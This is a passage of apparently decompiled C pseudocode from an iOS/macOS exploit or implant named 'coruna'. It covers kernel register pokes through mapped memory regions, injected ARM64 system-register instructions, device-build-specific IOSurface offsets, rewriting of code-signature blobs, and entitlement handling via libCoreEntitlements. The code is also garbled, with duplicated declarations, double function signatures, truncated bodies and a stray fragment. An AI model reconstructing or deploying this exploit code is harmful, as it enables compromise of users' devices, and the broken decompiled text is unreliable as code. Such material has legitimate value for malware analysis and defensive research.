  coruna_dispatch_group_wait(val,handle + 0xd8);
  coruna_call_mach_port_deallocate_2ddc8(handle + 0x80);
  coruna_call_mach_port_deallocate_2ddc8(handle + 0x40);
  coruna_call_mach_port_deallocate_2ddc8(handle);
  coruna_ptr_clear(handle + 200);
  return;
}





uint64_t coruna_mach_absolute_time_20ae8(long handle)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  double ld5;
  double ld6;
  unsigned long scratch;
  mach_timebase_info_t bootargs;
  uint64_t scratch;
  
  scratch = 0;
  if (*(char *)(handle + 0xc0) != '\0') {
    if ((*(char *)(handle + 0xd1) != '\0') &&
       (err = coruna_vm_region_write_u32(handle + 0x40,0x300,1), err != 0)) {
      *(uint8_t *)(handle + 0xd1) = 0;
    }
    if ((*(char *)(handle + 0xd0) != '\0') &&
       (err = coruna_vm_region_write_u32(handle + 0x40,0xfb0,0), err != 0)) {
      *(uint8_t *)(handle + 0xd0) = 0;
    }
    u = coruna_vm_region_slot_read(handle,0,&scratch);
    if ((int)u == 0) {
      return u;
    }
    scratch = scratch & 0xffffffff2fffffff | 0x40000000;
    u = coruna_vm_region_slot_write(handle,0);
    if ((int)u == 0) {
      return u;
    }
    bootargs.numer = 0;
    bootargs.denom = 0;
    scratch = 0;
    _mach_timebase_info(&bootargs);
    ld5 = (double)NEON_ucvtf((unsigned long)bootargs >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)bootargs & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_37740;
    size = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_374d0;
    do {
      version = _mach_absolute_time();
      if (((unsigned long)(long)(ld5 + (double)size) <= version) ||
         (err = coruna_vm_region_slot_read(handle,0,&scratch), err == 0)) {
        return 0;
      }
    } while ((scratch >> 4 & 1) != 0);
    *(uint8_t *)(handle + 0xc0) = 0;
  }
  return 1;
}





uint64_t coruna_mach_absolute_time_20c14(long handle,uint size,uint64_t *val)
{
  long handle;
  unsigned long u;
  mach_timebase_info_t lm3;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  double ld8;
  mach_timebase_info_t scratch;
  uint bootargs;
  uint64_t thread_attr;
  
  thread_attr = 0;
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  lm3 = scratch;
  u = (unsigned long)scratch >> 0x20;
  handle = handle + 0x40;
  err = coruna_vm_region_write_u32(handle,0x84,size & 0xff | 0xd5130400);
  size = 0;
  if (err != 0) {
    ld8 = ((double)u / (double)((unsigned long)lm3 & 0xffffffff)) * k_kernel_rodata_word_37740;
    version = _mach_absolute_time();
    ld8 = ld8 * k_kernel_rodata_word_374d0;
    do {
      port = _mach_absolute_time();
      if ((unsigned long)(long)(ld8 + (double)version) <= port) {
        return 0;
      }
      size = coruna_vm_region_read_u32(handle,0x88,&bootargs);
      if ((int)size == 0) {
        return size;
      }
    } while ((bootargs & 0x1000040) == 0);
    size = coruna_mach_absolute_time_20f90(handle);
    if ((((int)size != 0) &&
        (size = coruna_vm_region_read_u32(handle,0x8c,(long)&thread_attr + 4), (int)size != 0)) &&
       (size = coruna_vm_region_read_u32(handle,0x80,&thread_attr), (int)size != 0)) {
      *val = coruna_u64_pack(((uint32_t)thread_attr), (thread_attr));
      size = 1;
    }
  }
  return size;
}





uint64_t coruna_mach_absolute_time_20d4c(long handle,uint64_t val)
{
  unsigned long u;
  mach_timebase_info_t lm2;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  double ld7;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  lm2 = scratch;
  u = (unsigned long)scratch >> 0x20;
  err = coruna_vm_region_write_u32(handle + 0x40,0x84,val);
  size = 0;
  if (err != 0) {
    ld7 = ((double)u / (double)((unsigned long)lm2 & 0xffffffff)) * k_kernel_rodata_word_37740;
    version = _mach_absolute_time();
    ld7 = ld7 * k_kernel_rodata_word_374d0;
    do {
      port = _mach_absolute_time();
      if ((unsigned long)(long)(ld7 + (double)version) <= port) goto fail;
      size = coruna_vm_region_read_u32(handle + 0x40,0x88,&bootargs);
      if ((int)size == 0) {
        return size;
      }
    } while ((bootargs & 0x1000040) == 0);
    if ((bootargs >> 6 & 1) == 0) {
      size = 1;
    }
    else {
      coruna_kernel600c_via_vm_region_read_u32(handle,0x90,0xfffffffb,4);
fail:
      size = 0;
    }
  }
  return size;
}





uint64_t coruna_mach_absolute_time_20e4c(long handle,uint size,unsigned long arg)
{
  long handle;
  uint u;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  unsigned long tag;
  double ld8;
  double ld9;
  unsigned long kind;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  kind = (unsigned long)scratch & 0xffffffff;
  tag = (unsigned long)scratch >> 0x20;
  handle = handle + 0x40;
  err = coruna_vm_region_write_u32(handle,0x8c,arg >> 0x20);
  size = 0;
  if ((err != 0) && (size = coruna_vm_region_write_u32(handle,0x80,arg), (int)size != 0)) {
    ld8 = (double)NEON_ucvtf(tag);
    ld9 = (double)NEON_ucvtf(kind);
    ld8 = (ld8 / ld9) * k_kernel_rodata_word_37740;
    version = _mach_absolute_time();
    ld8 = ld8 * k_kernel_rodata_word_374d0;
    do {
      port = _mach_absolute_time();
      if ((unsigned long)(long)(ld8 + (double)version) <= port) goto fail;
      size = coruna_vm_region_read_u32(handle,0x88,&bootargs);
      if ((int)size == 0) {
        return size;
      }
    } while ((bootargs & 0x40000040) == 0);
    if ((bootargs >> 6 & 1) == 0) {
      u = size & 0xff | 0xd5330400;
      tag = coruna_mach_absolute_time_20d4c(handle,u);
      if (((tag & 1) != 0) || (size = coruna_mach_absolute_time_20d4c(handle,u), (int)size != 0)) {
        size = 1;
      }
    }
    else {
      coruna_kernel600c_via_vm_region_read_u32(handle,0x90,0xfffffffb,4);
fail:
      size = 0;
    }
  }
  return size;
}





uint64_t coruna_mach_absolute_time_20f90(long handle)
{
  uint64_t u;
  uint64_t size;
  uint64_t version;
  double ld4;
  double ld5;
  mach_timebase_info_t scratch;
  uint bootargs;
  
  bootargs = 0;
  scratch.numer = 0;
  scratch.denom = 0;
  _mach_timebase_info(&scratch);
  ld4 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
  ld5 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
  ld4 = (ld4 / ld5) * k_kernel_rodata_word_37740;
  u = _mach_absolute_time();
  ld4 = ld4 * k_kernel_rodata_word_374d0;
  do {
    size = _mach_absolute_time();
    if ((unsigned long)(long)(ld4 + (double)u) <= size) goto fail;
    version = coruna_vm_region_read_u32(handle + 0x40,0x88,&bootargs);
    if ((int)version == 0) {
      return version;
    }
  } while ((bootargs & 0x20000040) == 0);
  if ((bootargs >> 6 & 1) == 0) {
    version = 1;
  }
  else {
    coruna_kernel600c_via_vm_region_read_u32(handle,0x90,0xfffffffb,4);
fail:
    version = 0;
  }
  return version;
}





uint64_t coruna_kernel600c_via_vm_region_read_u32(long handle,uint64_t val,uint size,uint flags_2)
{
  int err;
  uint64_t u;
  uint scratch;
  
  scratch = 0;
  err = coruna_vm_region_read_u32(handle + 0x40,val,&scratch);
  u = 0;
  if (err != 0) {
    scratch = scratch & size | flags_2;
    u = coruna_vm_region_write_u32(handle + 0x40,val);
  }
  return u;
}





uint64_t coruna_kernel29d3c_via_mach_absolute_time_20d4c(uint64_t val)
{
  int err;
  uint64_t u;
  
  err = coruna_mach_absolute_time_20d4c(val,0xd5033fdf);
  if (((err != 0) && (err = coruna_mach_absolute_time_20d4c(val,0xd508871f), err != 0)) &&
     (err = coruna_mach_absolute_time_20d4c(val,0xd5033f9f), err != 0)) {
    u = coruna_mach_absolute_time_20d4c(val,0xd5033fdf);
    return u;
  }
  return 0;
}





void coruna_kernel600c_via_mach_absolute_time_20e4c_2(uint64_t val,long handle)
{
  int err;
  uint64_t scratch;
  uint64_t bootargs;
  uint8_t scratch;
  uint64_t thread_attr;
  
  err = coruna_ctx_test_flag(val,0x84000);
  if (((err == 0) && (err = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1c57c(val,&scratch,&scratch), err != 0)) &&
     (err = coruna_mach_absolute_time_20c14(handle,0,&thread_attr), err != 0)) {
    err = coruna_mach_absolute_time_20e4c(handle,0,scratch);
    if (((err != 0) && (err = coruna_mach_absolute_time_20d4c(handle,0xd5182040), err != 0)) &&
       ((err = coruna_mach_absolute_time_20e4c(handle,0,bootargs), err != 0 &&
        (err = coruna_mach_absolute_time_20d4c(handle,0xd5182000), err != 0)))) {
      *(uint8_t *)(handle + 0xd2) = 0;
      coruna_kernel29d3c_via_mach_absolute_time_20d4c(handle);
    }
    coruna_mach_absolute_time_20e4c(handle,0,thread_attr);
  }
  return;
}





void coruna_kernel29d3c_via_mach_absolute_time_20d4c_2(uint64_t val,byte *arg)
{
  unsigned long u;
  int err;
  unsigned long scratch;
  uint64_t bootargs;
  
  scratch = 0;
  bootargs = 0;
  err = coruna_mach_absolute_time_20c14(val,0,&bootargs);
  if (err == 0) {
    return;
  }
  err = coruna_mach_absolute_time_20d4c(val,0xd5381000);
  if ((err != 0) && (err = coruna_mach_absolute_time_20c14(val,0,&scratch), u = scratch, err != 0)) {
    if ((scratch & 1) == 0) {
      err = coruna_mach_absolute_time_20e4c(val,0,scratch | 1);
      coruna_mach_absolute_time_20e4c(val,0,bootargs);
      return;
    }
    if (arg != (byte *)0x0) {
      *arg = ~(byte)u & 1;
    }
  }
fail:
  coruna_mach_absolute_time_20e4c(val,0,bootargs);
  return;
}





void coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1c57c_2(long handle,uint64_t val,long *addr_2,byte arg,long *off_3)
{
  uint64_t u;
  unsigned long size;
  unsigned long *ptr;
  unsigned long version;
  int err;
  long handle;
  long addr;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long sa_saved;
  unsigned long sa_new;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t url_buf;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  handle = coruna_kernel600c_via_return_zero_28a34();
  addr = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot != frame) {
  ___stack_chk_fail(addr);
  }
  return;
}





uint64_t coruna_return_zero_24300(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  uint32_t u;
  uint32_t size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      size = 0x240;
      u = 0x238;
    }
    else if (err == 0x1c1b) {
      size = 0x228;
      u = 0x220;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      u = 0x358;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2a8;
      }
      size = 0x360;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x2b0;
      }
    }
  }
  else if (err < 0x225c) {
    if (err != 0x1f54 && err != 0x2258) {
      return 0;
    }
    size = 0x358;
    u = 0x350;
  }
  else {
    if (err != 0x225c && err != 0x2712) {
      return 0;
    }
    size = 0x550;
    u = 0x548;
  }
  *size = u;
  *flags_2 = size;
  return 1;
}





uint64_t coruna_iosurface_wire_meta_offsets(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  bool err;
  uint64_t u;
  int status;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (size != (uint32_t *)0x0) {
      *size = 0x78;
    }
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = 0x50;
    }
    u = 1;
  }
  return u;
}





void coruna_cc_sha256_update(int flags,void *ctx,CC_LONG arg,void *scratch,uint *size)
{
  uint u;
  uint64_t size;
  CC_SHA512_CTX CStack_148;
  uchar scratch [48];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  if (flags - 1U < 4) {
    u = *(uint *)(&k_kernel_rodata_word_377a0 + (long)(int)(flags - 1U) * 4);
    if (u <= *size) {
      if (flags - 2U < 2) {
        _CC_SHA256_Init((CC_SHA256_CTX *)&CStack_148);
        _CC_SHA256_Update((CC_SHA256_CTX *)&CStack_148,ctx,arg);
        _CC_SHA256_Final(scratch,(CC_SHA256_CTX *)&CStack_148);
      }
      else if (flags == 4) {
        _CC_SHA384_Init(&CStack_148);
        _CC_SHA384_Update(&CStack_148,ctx,arg);
        _CC_SHA384_Final(scratch,&CStack_148);
      }
      else {
        size = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
        return;
        }
        ___stack_chk_fail(size);
      }
      _memcpy(scratch,scratch,(unsigned long)u);
      *size = u;
      size = 1;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
fail:
  size = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}





uint64_t
void coruna_cfrelease(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            long *handle,uint64_t *off_5,uint64_t off_6)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t scratch;
  
  handle = coruna_cfreadstreamcreatewithbytesnocopy();
  if (handle == 0) {
    u = 0;
  }
  else {
    addr = coruna_cfreadstreamcreatewithbytesnocopy(size_3,off_4);
    if (addr == 0) {
      u = 0;
    }
    else {
      err = coruna_kernel600c_via_cfdictionaryapplyfunction(handle,addr,off_6);
      if ((err == 0) || (off = coruna_cfpropertylistcreatedata(handle,&scratch), off == 0)) {
        u = 0;
      }
      else {
        *off_5 = scratch;
        *handle = off;
        u = 1;
      }
      _CFRelease(handle);
      handle = addr;
    }
    _CFRelease(handle);
  }
  return u;
}





void coruna_cfreadstreamcreatewithbytesnocopy(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFReadStreamCreateWithBytesNoCopy
                    (u,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
  if (handle == 0) {
    return;
  }
  err = _CFReadStreamOpen();
  _CFRelease(handle);
  return;
}





bool coruna_kernel600c_via_cfdictionaryapplyfunction(uint64_t val,uint64_t id_2,uint8_t *buf)
{
  int err;
  
  if (buf != (uint8_t *)0x0) {
    err = coruna_cfdictionaryapplyfunction_f82c(val,id_2);
    if (err == 0) {
      *buf = 1;
      return true;
    }
    *buf = 0;
  }
  err = coruna_cfdictionaryapplyfunction(val,id_2);
  return err == 0;
}





void * coruna_cfpropertylistcreatedata(uint64_t val,size_t *len)
{
  long handle;
  size_t ls2;
  void *ptr;
  void *buf;
  long scratch;
  
  scratch = 0;
  handle = _CFPropertyListCreateData
                    (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,100,0,&scratch);
  if (handle == 0) {
    handle = scratch;
    if (scratch == 0) {
      return (void *)0x0;
    }
  }
  else {
    ls2 = _CFDataGetLength();
    if (ls2 != 0) {
      ptr = _malloc(ls2);
      if (ptr != (void *)0x0) {
        buf = (void *)_CFDataGetBytePtr(handle);
        _memcpy(ptr,buf,ls2);
        *len = ls2;
      }
      _CFRelease(handle);
      return ptr;
    }
  }
  ptr = (void *)0x0;
fail:
  _CFRelease(handle);
  return ptr;
}





bool coruna_strlcpy_21a90(uint *size,uint64_t val,char *path)
{
  uint u;
  char *ptr;
  uint size;
  uint version;
  uint port;
  uint tag;
  bool err;
  int err;
  void *ptr;
  size_t ls11;
  void *buf;
  uint8_t scratch[104];
  uint kind;
  
  err = coruna_plist_dict_21c8c(size,val,scratch);
  if (err == 0) {
    return false;
  }
  if ((*size & 0x5584001) == 0) {
    err = 0x1f52ffffffffff < *(unsigned long *)(size + 0x56);
  }
  else {
    err = true;
  }
  ptr = (void *)coruna_wire_map_lookup(scratch,0,0xfade0c02);
  if (ptr == (void *)0x0) {
fail:
    err = false;
  }
  else {
    size = *(uint *)((long)ptr + 0x14);
    port = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    port = port >> 0x10 | port << 0x10;
    if (path == (char *)0x0) {
      if (size != 0) {
        buf = (void *)0x0;
        *(uint32_t *)((long)ptr + 0x14) = 0;
done:
        if (size != 0 && !err) {
          ptr = (char *)((long)ptr + (unsigned long)port);
          ls11 = _strlen(ptr);
          _bzero(ptr,ls11);
        }
cleanup:
        err = coruna_kernel600c_via_memcpy_25294(scratch,0,ptr);
        if (err == 0) {
          err = false;
        }
        else {
          err = coruna_kernel600c_via_ctx_test_flag_12(size,scratch);
          err = err != 0;
        }
        if (buf != (void *)0x0) {
          _free(buf);
        }
        coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
        return err;
      }
    }
    else {
      version = *(uint *)((long)ptr + 4);
      if ((size == 0) ||
         (err = _strcmp((char *)((long)ptr + (unsigned long)port),path), err != 0)) {
        tag = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
        kind = tag >> 0x10 | tag << 0x10;
        ls11 = _strlen(path);
        tag = (int)ls11 + 1;
        if (err) {
          if (tag < 0x81) {
            kind = kind - 0x80;
            size = (kind & 0xff00ff00) >> 8 | (kind & 0xff00ff) << 8;
            *(uint *)((long)ptr + 0x14) = size >> 0x10 | size << 0x10;
            ptr = (char *)((long)ptr + (unsigned long)kind);
            ptr[0x68] = '\0';
            ptr[0x69] = '\0';
            ptr[0x6a] = '\0';
            ptr[0x6b] = '\0';
            ptr[0x6c] = '\0';
            ptr[0x6d] = '\0';
            ptr[0x6e] = '\0';
            ptr[0x6f] = '\0';
            ptr[0x60] = '\0';
            ptr[0x61] = '\0';
            ptr[0x62] = '\0';
            ptr[99] = '\0';
            ptr[100] = '\0';
            ptr[0x65] = '\0';
            ptr[0x66] = '\0';
            ptr[0x67] = '\0';
            ptr[0x78] = '\0';
            ptr[0x79] = '\0';
            ptr[0x7a] = '\0';
            ptr[0x7b] = '\0';
            ptr[0x7c] = '\0';
            ptr[0x7d] = '\0';
            ptr[0x7e] = '\0';
            ptr[0x7f] = '\0';
            ptr[0x70] = '\0';
            ptr[0x71] = '\0';
            ptr[0x72] = '\0';
            ptr[0x73] = '\0';
            ptr[0x74] = '\0';
            ptr[0x75] = '\0';
            ptr[0x76] = '\0';
            ptr[0x77] = '\0';
            ptr[0x48] = '\0';
            ptr[0x49] = '\0';
            ptr[0x4a] = '\0';
            ptr[0x4b] = '\0';
            ptr[0x4c] = '\0';
            ptr[0x4d] = '\0';
            ptr[0x4e] = '\0';
            ptr[0x4f] = '\0';
            ptr[0x40] = '\0';
            ptr[0x41] = '\0';
            ptr[0x42] = '\0';
            ptr[0x43] = '\0';
            ptr[0x44] = '\0';
            ptr[0x45] = '\0';
            ptr[0x46] = '\0';
            ptr[0x47] = '\0';
            ptr[0x58] = '\0';
            ptr[0x59] = '\0';
            ptr[0x5a] = '\0';
            ptr[0x5b] = '\0';
            ptr[0x5c] = '\0';
            ptr[0x5d] = '\0';
            ptr[0x5e] = '\0';
            ptr[0x5f] = '\0';
            ptr[0x50] = '\0';
            ptr[0x51] = '\0';
            ptr[0x52] = '\0';
            ptr[0x53] = '\0';
            ptr[0x54] = '\0';
            ptr[0x55] = '\0';
            ptr[0x56] = '\0';
            ptr[0x57] = '\0';
            ptr[0x28] = '\0';
            ptr[0x29] = '\0';
            ptr[0x2a] = '\0';
            ptr[0x2b] = '\0';
            ptr[0x2c] = '\0';
            ptr[0x2d] = '\0';
            ptr[0x2e] = '\0';
            ptr[0x2f] = '\0';
            ptr[0x20] = '\0';
            ptr[0x21] = '\0';
            ptr[0x22] = '\0';
            ptr[0x23] = '\0';
            ptr[0x24] = '\0';
            ptr[0x25] = '\0';
            ptr[0x26] = '\0';
            ptr[0x27] = '\0';
            ptr[0x38] = '\0';
            ptr[0x39] = '\0';
            ptr[0x3a] = '\0';
            ptr[0x3b] = '\0';
            ptr[0x3c] = '\0';
            ptr[0x3d] = '\0';
            ptr[0x3e] = '\0';
            ptr[0x3f] = '\0';
            ptr[0x30] = '\0';
            ptr[0x31] = '\0';
            ptr[0x32] = '\0';
            ptr[0x33] = '\0';
            ptr[0x34] = '\0';
            ptr[0x35] = '\0';
            ptr[0x36] = '\0';
            ptr[0x37] = '\0';
            ptr[8] = '\0';
            ptr[9] = '\0';
            ptr[10] = '\0';
            ptr[0xb] = '\0';
            ptr[0xc] = '\0';
            ptr[0xd] = '\0';
            ptr[0xe] = '\0';
            ptr[0xf] = '\0';
            ptr[0] = '\0';
            ptr[1] = '\0';
            ptr[2] = '\0';
            ptr[3] = '\0';
            ptr[4] = '\0';
            ptr[5] = '\0';
            ptr[6] = '\0';
            ptr[7] = '\0';
            ptr[0x18] = '\0';
            ptr[0x19] = '\0';
            ptr[0x1a] = '\0';
            ptr[0x1b] = '\0';
            ptr[0x1c] = '\0';
            ptr[0x1d] = '\0';
            ptr[0x1e] = '\0';
            ptr[0x1f] = '\0';
            ptr[0x10] = '\0';
            ptr[0x11] = '\0';
            ptr[0x12] = '\0';
            ptr[0x13] = '\0';
            ptr[0x14] = '\0';
            ptr[0x15] = '\0';
            ptr[0x16] = '\0';
            ptr[0x17] = '\0';
            _strlcpy(ptr,path,(unsigned long)tag);
            buf = (void *)0x0;
            err = coruna_kernel600c_via_memcpy_25294(scratch,0,ptr);
            if (err == 0) {
            err = false;
            }
            else {
            err = coruna_kernel600c_via_ctx_test_flag_12(size,scratch);
            err = err != 0;
            }
            if (buf != (void *)0x0) {
            _free(buf);
            }
            coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
            return err;
          }
        }
        else {
          u = tag + kind;
          buf = _calloc((unsigned long)u,1);
          if (buf != (void *)0x0) {
            _memcpy(buf,ptr,(unsigned long)kind);
            *(uint *)((long)buf + 0x14) = version;
            _strlcpy((char *)((long)buf + (unsigned long)kind),path,(unsigned long)tag);
            version = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
            *(uint *)((long)buf + 4) = version >> 0x10 | version << 0x10;
            ptr = buf;
            if (size != 0 && !err) {
            ptr = (char *)((long)ptr + (unsigned long)port);
            ls11 = _strlen(ptr);
            _bzero(ptr,ls11);
            }
            err = coruna_kernel600c_via_memcpy_25294(scratch,0,ptr);
            if (err == 0) {
            err = false;
            }
            else {
            err = coruna_kernel600c_via_ctx_test_flag_12(size,scratch);
            err = err != 0;
            }
            if (buf != (void *)0x0) {
            _free(buf);
            }
            coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
            return err;
          }
        }
        goto fail;
      }
    }
    err = true;
  }
check_ok:
  coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
  return err;
}





uint64_t coruna_plist_dict_21c8c(uint *size,uint64_t val,uint64_t *id_2)
{
  uint32_t u;
  uint size;
  uint version;
  uint port;
  bool err;
  uint64_t tag;
  uint64_t kind;
  char err;
  int err;
  uint64_t type_id;
  long handle;
  long addr;
  void *ptr;
  void *buf;
  size_t ls16;
  unsigned long type_id_8;
  char *ptr;
  char *buf;
  unsigned long type_id_9;
  unsigned long type_id_10;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  char *thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  char *stack_guard;
  uint type_id_11;
  
  err = coruna_return_zero_23ef8(size,val,0,1,&scratch);
  if ((err == 0) && (type_id = coruna_return_zero_23ef8(size,val,0,0,&scratch), (int)type_id == 0)) {
    return type_id;
  }
  type_id_8 = *(unsigned long *)(size + 0x56);
  if ((0x1c1b19145fffff < type_id_8) && ((*size & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_8)) {
    serial_buf = coruna_u64_pack71((serial_buf), (1));
  }
  if ((unsigned long)thread_attr >> 0x1d != 0) {
    handle = coruna_kernel600c_via_return_zero_28a34(size,host_info);
    if ((handle != 0) && (err = coruna_return_zero_24300(size,&block_ctx,&action), err != 0)) {
      handle = handle + (action & 0xffffffff);
      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,handle,8,&stack_guard);
      coruna_kernel600c_via_kernel5_via_bzero_5(&scratch);
      return 0;
    }
    coruna_kernel600c_via_kernel5_via_bzero_5(&scratch);
    return 0;
  }
  handle = coruna_wire_map_lookup(&scratch,host_info & 0xffffffff,0xfade0c02);
  coruna_kernel600c_via_kernel5_via_bzero_5(&scratch);
  return 0;
}





uint * coruna_wire_map_lookup(long handle,int flags,uint size)
{
  uint u;
  unsigned long size;
  uint64_t *ptr;
  
  if (handle != 0) {
    if (*(int *)(handle + 0x30) == 0) {
      if ((flags == 0) && (**(uint **)(handle + 0x38) == 0x20cdefa)) {
        return *(uint **)(handle + 0x38);
      }
    }
    else if (*(int *)(handle + 0x30) == 1) {
      u = **(uint **)(handle + 0x38);
      size = (unsigned long)u;
      if (u != 0) {
        ptr = (uint64_t *)(*(long *)(*(uint **)(handle + 0x38) + 2) + 8);
        do {
          if ((*(int *)(ptr + -1) == flags) &&
             (u = *(uint *)*ptr, u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8,
             (u >> 0x10 | u << 0x10) == size)) {
            return (uint *)*ptr;
          }
          ptr = ptr + 2;
          size = size - 1;
        } while (size != 0);
      }
    }
  }
  return (uint *)0x0;
}





uint64_t coruna_kernel600c_via_memcpy_25294(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  long addr;
  uint64_t u;
  
  handle = coruna_wire_map_slot_lookup(val,id_2,0xfade0c02);
  u = 0;
  if ((handle != 0) && (addr = coruna_memcpy_25294(size_3), u = 0, addr != 0)) {
    u = *(uint64_t *)(handle + 8);
    *(long *)(handle + 8) = addr;
    coruna_bzero(u);
    u = 1;
  }
  return u;
}





unsigned long coruna_kernel600c_via_ctx_test_flag_12(long arg,uint64_t val)

{
  int fd_11;
  unsigned long type_id_17;
  long cache_91;
  uint64_t cache_89;
  uint cache_54;
  
  cache_54 = 0;
  cache_91 = arg;
  cache_89 = val;
  if ((*(unsigned long *)(arg + 0x158) < 0x1c1b1914600000) ||
     (fd_11 = coruna_ctx_test_flag(arg,4), fd_11 != 0)) {
    coruna_pthread_create_suspended_np(&cache_91);
  }
  else {
    fd_11 = coruna_ctx_test_flag(arg,0x5584001);
    if ((fd_11 == 0) || (0x1c1b1e025fffff < *(unsigned long *)(arg + 0x158))) {
      type_id_17 = coruna_pthread_join_2f17c(arg,coruna_pthread_create_suspended_np,&cache_91);
      fd_11 = (int)type_id_17;
    }
    else {
      type_id_17 = coruna_return_zero_1a5c8(arg,coruna_pthread_create_suspended_np,&cache_91);
      fd_11 = (int)type_id_17;
    }
    if (fd_11 == 0) {
      return type_id_17;
    }
  }
  return (unsigned long)cache_54;
}





void coruna_kernel600c_via_kernel5_via_bzero_5(long handle)
{
  if (*(int *)(handle + 0x30) == 0) {
    coruna_bzero(*(uint64_t *)(handle + 0x38));
  }
  else if (*(int *)(handle + 0x30) == 1) {
    coruna_kernel5_via_bzero_5(*(uint64_t *)(handle + 0x38));
  }
  *(uint64_t *)(handle + 0x38) = 0;
  *(uint32_t *)(handle + 0x30) = 0xffffffff;
  return;
}





    coruna_cfdatagetbyteptr(size,arg,path,1);
    if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
    return;
    }





uint64_t
void coruna_load_core_entitlements(uint64_t val,uint64_t id_2)
{
  long handle;
  long addr;
  uint64_t *ptr;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  handle = _dlopen("/usr/lib/libCoreEntitlements.dylib",1);
  if (((handle != 0) && (addr = _dlsym(handle,"kCENoError"), addr != 0)) &&
     (ptr = (uint64_t *)_dlsym(handle,"CECRuntime"), ptr != (uint64_t *)0x0)) {
    u = *ptr;
    addr = _dlsym(handle,"CEManagedContextFromCFData");
    if ((((addr != 0) && (addr = _dlsym(handle,"CEQueryContextToCFDictionary"), addr != 0)) &&
        ((addr = _dlsym(handle,"CESerializeCFDictionary"), addr != 0 &&
         ((addr = _dlsym(handle,"CEReleaseManagedContext"), addr != 0 &&
          (addr = _dlsym(handle,"CEGetErrorString"), addr != 0)))))) &&
       (addr = _CFDataCreateWithBytesNoCopy
                          (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,id_2,
                           *(uint64_t *)k_kernel_kcfallocatornull_slot), addr != 0)) {
      coruna_kernel600c_via_helper_5d2c_419fc_2(u,addr,&scratch);
    }
  }
  if (thread_attr != 0) {
    _CFRelease();
  }
  if (bootargs != 0) {
    _CFRelease();
  }
